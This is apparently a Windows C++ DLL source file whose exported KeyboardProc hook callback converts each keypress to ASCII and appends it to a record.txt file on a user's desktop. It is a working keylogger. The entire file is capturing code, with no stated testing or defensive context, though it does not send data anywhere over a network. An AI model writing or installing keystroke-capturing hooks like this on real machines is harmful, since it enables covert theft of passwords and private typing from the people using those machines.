// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <stdio.h>
#include <fstream>
#include <iostream>
using namespace std;
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;


}
_declspec(dllexport) LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
	//FILE * f = fopen("C:\\Users\\qy\\Desktop\\record.txt","w+");
	//fseek(f,0,SEEK_END);
	ofstream fout ;
	fout.open("C:\\Users\\qy\\Desktop\\record.txt",ios::app);
	if(code <0 || code != HC_ACTION)
		return CallNextHookEx(NULL,code,wParam,lParam);

	if(((DWORD)lParam & 0x80000000) == 0 && (HC_ACTION == code))
	{
		if( wParam == VK_SPACE || wParam == VK_RETURN || ((wParam >= 0x2f) && (wParam <= 0x100)))
		{
			BYTE ks[256];
			GetKeyboardState(ks);

			WORD w;
			UINT scan = 0;
			ToAscii(wParam,scan,ks,&w,0);
			fout << char(w);

		}
	}

	fout.close();
	return CallNextHookEx(NULL,code,wParam,lParam);
	

}


